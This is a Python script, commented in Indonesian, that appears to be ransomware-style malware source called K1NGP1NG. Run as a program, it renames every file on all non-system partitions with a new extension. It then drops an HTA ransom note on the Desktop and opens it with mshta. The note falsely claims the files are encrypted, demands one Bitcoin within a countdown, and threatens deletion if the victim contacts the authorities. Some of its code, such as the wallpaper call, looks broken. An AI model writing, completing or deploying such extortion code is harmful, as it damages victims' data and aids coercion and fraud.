import os
import ctypes
import psutil, time, subprocess

# Fungsi untuk mengganti ekstensi file menjadi .K1NGP1NG
def change_extension(file_path):
    try:
        # File baru dengan ekstensi .K1NGP1NG
        new_file_path = file_path + '.K1NGP1NG'

        # Ganti nama file menjadi ekstensi baru
        os.rename(file_path, new_file_path)

        return True, f"{file_path} berhasil diubah menjadi {new_file_path}"

    except Exception as e:
        return False, f"Gagal mengganti ekstensi {file_path}: {e}"


# Fungsi untuk mengganti ekstensi file dalam folder
def process_folder(folder_path):
    for root, _, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            success, message = change_extension(file_path)
            print(message)

def note():
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    note_path = os.path.join(desktop_path, 'K1NGP1NG-N0T3.hta')
    hta_content = """<!DOCTYPE html>
    <html>
    <head>
        <title>K1NGP1NG-N0T3</title>
        <HTA:APPLICATION 
            APPLICATIONNAME="K1NP1NG-N0T3"
            BORDER="none"
            CAPTION="no"
            SHOWINTASKBAR="yes"
            SINGLEINSTANCE="yes"
            SYSMENU="no"
            WINDOWSTATE="maximize">
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #000;
                color: #fff;
                text-align: center;
                padding: 50px;
            }
            h1 {
                color: red;
            }
            p {
                font-size: 18px;
            }
            .button {
                background-color: red;
                color: white;
                padding: 15px 25px;
                text-decoration: none;
                font-size: 20px;
                border: none;
                cursor: pointer;
            }
            #countdown {
                font-size: 24px;
                color: yellow;
            }
        </style>
        <script>
            // Menghitung waktu mundur
            var countdownTime = 72 * 60 * 60; // 72 jam dalam detik
            var countdownElement;

            function startCountdown() {
                countdownElement = document.getElementById("countdown");
                var interval = setInterval(function() {
                    var hours = Math.floor(countdownTime / 3600);
                    var minutes = Math.floor((countdownTime % 3600) / 60);
                    var seconds = countdownTime % 60;

                    countdownElement.innerHTML = hours + " jam " + minutes + " menit " + seconds + " detik tersisa.";

                    if (countdownTime <= 0) {
                        clearInterval(interval);
                        countdownElement.innerHTML = "Waktu habis!";
                    }
                    countdownTime--;
                }, 1000);
            }

            // Mendapatkan hostname
            function getHostname() {
                var hostname = window.location.hostname;
                document.getElementById("hostname").innerHTML = "Hostname: " + hostname;
            }

            window.onload = function() {
                startCountdown();
                getHostname();
            };
        </script>
    </head>
    <body>
        <h1>PERINGATAN!</h1>
        <p>Semua file Anda telah dienkripsi!</p>
        <p>Untuk mendapatkan kembali akses ke file Anda, Anda harus membayar tebusan sebesar <strong>1 Bitcoin</strong>.</p>
        <p>Jika Anda tidak membayar dalam waktu <span id="countdown"></span>, semua file Anda akan dihapus selamanya!</p>
        <p>Silakan kirim pembayaran ke alamat dompet berikut:</p>
        <p><strong>1A2B3C4D5E6F7G8H9I0J</strong></p>
        <p>Setelah pembayaran dilakukan, kirimkan bukti pembayaran ke email: <strong>support@example.com</strong></p>
        <p>Jangan coba untuk menghubungi pihak berwenang, kami akan melacak Anda!</p>
        <p id="hostname"></p>
        <button class="button" onclick="window.close();">Tutup</button>
    </body>
    </html>"""
    with open(note_path, 'w') as f:
        f.write(hta_content)
    subprocess.Popen(['mshta.exe', note_path])
    time.sleep(2)
    return note_path

# Fungsi untuk memproses semua partisi non-sistem
def process_all_partitions():
    # Ambil semua partisi yang terpasang
    partitions = psutil.disk_partitions()

    for partition in partitions:
        # Abaikan partisi sistem atau yang tidak valid
        if 'system' in partition.opts or partition.fstype == '':
            continue

        # Dapatkan path mount partisi
        partition_path = partition.mountpoint
        print(f"Mengganti ekstensi di partisi: {partition_path}")

        # Proses folder di partisi tersebut
        process_folder(partition_path)

def change_desktop_background_color(color):
    color_ref = (color[2] << 16) | (color[1] << 8) | color[0]
    # Menggunakan SystemParametersInfo untuk mengubah wallpaper
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, color_ref, 3)

if __name__ == "__main__":
    # Proses semua partisi non-sistem
    process_all_partitions()

    # Fungsi-fungsi lain yang tidak dipanggil
    # Buat catatan di desktop
    note()

    # Ganti wallpaper desktop
    change_desktop_background_color((0, 0, 255))